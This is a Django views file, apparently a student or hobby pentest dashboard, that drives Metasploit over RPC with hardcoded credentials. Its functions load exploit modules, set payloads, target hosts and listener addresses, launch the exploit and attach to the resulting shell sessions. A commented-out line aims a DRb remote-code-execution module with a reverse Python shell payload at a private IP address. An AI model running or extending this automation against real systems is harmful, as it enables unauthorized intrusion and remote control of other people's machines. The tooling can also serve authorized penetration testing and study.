from django.shortcuts import render
from django.views import View
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from django.template import loader
from django.http import HttpResponse, JsonResponse
from django import template
from pymetasploit3.msfrpc import MsfRpcClient
import time
import threading

from Users.models import User
from .models import Exploit

msf_user = 'msf'
msf_pass = 'msf'
msf_host = '127.0.0.1'
msf_port = 55552
# Khởi tạo đối tượng MsfRpcClient
client = MsfRpcClient(msf_pass, port=msf_port,
                      username=msf_user, server=msf_host)
# Create your views here.

class Main(View):
    def get(self, request, **kwargs):
        username = request.user.username
        module = Exploit.objects.all()
        return render(request, "dashboard/index.html",{"username":username, "exploit_module": module})
def run_session(session):
    console = client.consoles.console()
    console.write("sessions -i "+ str(session))
    timeout = time.time() + 15
    while True:
        data = console.read()
        print(data)
        if "Invalid session identifier" in data['data']:
            return None, data['data']
        if time.time() > timeout :
            return None, "time out"
        if ("Starting interaction with") in data['data']:
            print(data)
            return console, data['data']
    return None

def run_command(console, cmd):
    console.write(cmd)
    output = console.read()
    return output
def console():
    return client.consoles.console()

def exploit(module, payload, rhost, rport, uri, lhost, lport ):
    print("start attack")
    console = client.consoles.console()
    console.write("use " + module)
    console.read()
    time.sleep(2)
    console.write("set payload "+payload)
    console.read()
    if lhost != None:
        console.write("set lhost " + lhost)
    if lport != None:
        console.write("set lport " + lport)
    if uri is None:
        console.write("use "+module)
        console.read()
        console.write("set rhosts "+rhost)
        if rport!=None:
            console.write("set rport " + rport)
        console.read()
    else:
        console.write("set uri "+uri)
        console.read()
    console.write('exploit')
    while True:
        output = console.read()['data']
        if "Exploit completed" in output:
            print(output)
            break
        if "Command shell session" in output:
            print(output)
            break

class LoadSessions(View):
    def get(self, request):
        # threading.Thread(target=exploit(module='exploit/linux/misc/drb_remote_codeexec', payload="cmd/unix/reverse_python", rhost="192.168.1.25",rport=None, lport=None, lhost=None, uri=None)).run()
        sessions = {"sessions":client.sessions.list}
        sessions = {"sessions": [{'name':"name", 'host':"127.0.0.1"},{'host':"1.1.1.1"}]}
        # sessions={"id":100}
        return JsonResponse(sessions)
class LoadSessionId(View):
    def get(self, request, id):
        return render(request, 'client/clientinfo.html')
class Msf(View):
    def get(self, request):
        return render(request, 'dashboard/msf.html')
